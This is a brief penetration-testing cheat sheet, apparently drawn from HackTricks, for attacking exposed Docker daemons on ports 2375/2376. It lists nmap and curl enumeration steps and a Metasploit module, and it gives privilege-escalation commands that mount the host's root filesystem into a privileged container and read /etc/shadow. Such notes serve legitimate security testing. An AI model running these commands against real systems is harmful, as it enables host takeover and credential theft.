# Docker 

Default port: `2375/tcp` and `2376/tcp` over TLS

## Enumeration

### Nmap 
```bash
nmap -sV --script "docker-*" -p 2375,2376 TARGET_IP
```
### Get version
Using curl

    curl -s http://TARGET_IP:2375/version | jq

Using docker

    docker -H TARGET_IP:2375 version


## CLI - Basic commands

### Download container images

    apt update
    docker pull SOURCE:latest

### Run container image 

    docker run -it SOURCE:latest

### Download container image source 

    docker save -o image.tar SOURCE:latest

### Analyse container image

    tar -xvf image.tar
    cat manifest.json | jq

### Privilege escalation

    docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
    
    docker -H TARGET_IP:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
    cat /mnt/etc/shadow

## Msf

    use exploit/linux/http/docker_daemon_tcp

## Source

- https://book.hacktricks.xyz/pentesting/2375-pentesting-docker#basic-commands